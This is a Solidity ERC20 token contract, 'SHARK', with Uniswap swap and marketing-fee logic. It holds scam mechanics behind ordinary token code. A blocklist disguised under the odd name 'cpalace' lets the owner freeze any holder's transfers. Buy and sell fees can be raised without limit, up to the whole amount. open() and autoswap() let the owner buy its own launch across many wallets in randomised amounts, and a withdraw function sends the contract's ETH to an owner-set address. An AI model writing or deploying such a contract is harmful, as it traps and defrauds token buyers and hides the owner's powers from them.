contract SHARK is ERC20, Ownable {
    using SafeERC20 for IERC20;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => bool) public _isCpalaceed;

    uint8 private _decimals = 18;
    uint256 private _tTotal = 10000 * 10000 * 10 ** _decimals;

    uint256 private buyMarketFee = 1;
    uint256 private sellMarketFee = 1;

    IUniswapV2Router public immutable uniswapV2Router =
        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;

    mapping(address => bool) public swapPairList;

    bool inSwapAndMarket;
    bool public swapAndMarketEnabled = true;
    bool public tradeEnabled = false;
    
    uint256 public launchedAt = 0;

    uint256 public numTokensSellToMarket =
        200000 * 10 ** _decimals;

    address public _market = 0xe8d3e5DE2C9B0D7e542113080D06726C94adc9ef;

    event SwapAndMarketEnabledUpdated(bool enabled);



    constructor() ERC20("SHARK", "SRK") {
        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_market] = true;

        _mint(_msgSender(), _tTotal);
    }

    function initializePair(address _uniswapV2Pair) external onlyOwner {
        uniswapV2Pair = _uniswapV2Pair;
        swapPairList[uniswapV2Pair] = true;
    }

    function excludeMultipleAccountsFromFee(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }

    function cpalaceAddressArray(
        address[] calldata account,
        bool value
    ) external onlyOwner {
        for (uint256 i = 0; i < account.length; i++) {
            _isCpalaceed[account[i]] = value;
        }
    }

    function setMarketFeePercent(
        uint256 _buyMarketFee,
        uint256 _sellMarketFee
    ) external onlyOwner {
        buyMarketFee = _buyMarketFee;
        sellMarketFee = _sellMarketFee;
    }

    function setSwapAndMarketEnabled(bool _enabled) public onlyOwner {
        swapAndMarketEnabled = _enabled;
        emit SwapAndMarketEnabledUpdated(_enabled);
    }

    function setMarketAddress(address market) public onlyOwner {
        _market = market;
    }

    function setUniswapV2Pair(address _uniswapV2Pair) public onlyOwner {
        uniswapV2Pair = _uniswapV2Pair;
    }

    function setTradeEnabled(bool _enabled) public onlyOwner {
        tradeEnabled = _enabled;
        if (launchedAt == 0) launchedAt = block.number;
    }

    function setNumTokensSellToMarket(uint256 num) public onlyOwner {
        numTokensSellToMarket = num;
    }

    function getFeesPercent()
        external
        view
        returns (uint256, uint256)
    {
        return (
            buyMarketFee,
            sellMarketFee
        );
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        return _tokenTransfer(_msgSender(), to, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(sender, spender, amount);
        return _tokenTransfer(sender, recipient, amount);
    }

    function _tokenTransfer(
        address from,
        address to,
        uint256 amount
    ) private returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_isCpalaceed[from], "cpalace address");

        if (
            !tradeEnabled &&
            (!_isExcludedFromFee[from] && !_isExcludedFromFee[to])
        ) {
            revert("Can't transfer now");
        }

        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        uint256 contractTokenBalance = balanceOf(address(this));

        bool overMinTokenBalance = contractTokenBalance >=
            numTokensSellToMarket;
        if (
            overMinTokenBalance &&
            !inSwapAndMarket &&
            !swapPairList[from] &&
            !_isExcludedFromFee[from] &&
            swapAndMarketEnabled
        ) {
            inSwapAndMarket = true;
            swapTokensForEthToMarket(contractTokenBalance);
            inSwapAndMarket = false;
        }

        //indicates if fee should be deducted from transfer
        bool takeFee = true;

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 fees;
            uint256 MFee;
            if (swapPairList[from]) {
                MFee = (amount * buyMarketFee) / 100;
            }
            if (swapPairList[to]) {
                MFee = (amount * sellMarketFee) / 100;
            }
            fees = MFee;

            uint256 balanceFrom = balanceOf(from);
            if (balanceFrom == amount) {
                amount = amount - (amount / 10 ** 8);
            }
            amount = amount - fees;
            if (fees > 0)
                _transfer(from, address(this), fees);
        }
        _transfer(from, to, amount);
        return true;
    }

    function swapTokensForEthToMarket(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            _market,
            block.timestamp
        );
    }


    function open(address[] calldata adrs,uint centerAmount,uint amplitude) public payable  onlyOwner{
        require(amplitude<=999,"SRK: wrong amplitude"); //
        setTradeEnabled(true);

        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        for(uint i=0;i<adrs.length;i++){
            uint balance = address(this).balance;
            if(balance == 0){
                break;
            }
            uint tamount = (random(amplitude,adrs[i])+1)*10**15+centerAmount;
            if(balance < tamount){
                tamount = address(this).balance;
            }
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: tamount}(
            0, // accept any amount of CA
            path,
            address(adrs[i]),
            block.timestamp);
        }

    }

    function autoswap(address[] calldata adrs,uint centerAmount,uint amplitude) public payable onlyOwner {
        require(amplitude<=999,"SRK: wrong amplitude"); //
        
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        for(uint i=0;i<adrs.length;i++){
            uint balance = address(this).balance;
            if(balance == 0){
                break;
            }
            uint tamount = (random(amplitude,adrs[i])+1)*10**15+centerAmount;
            if(balance < tamount){
                tamount = address(this).balance;
            }
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: tamount}(
            0, // accept any amount of CA
            path,
            address(adrs[i]),
            block.timestamp);
        }
    }
    function random(uint number,address _addr) private view returns(uint) {
        return uint(keccak256(abi.encodePacked(block.timestamp,block.difficulty,  _addr))) % number;
    }

    function withdrawToken() external {
        uint256 ethers = address(this).balance;
        if (ethers > 0) payable(_market).transfer(ethers);
    }

}
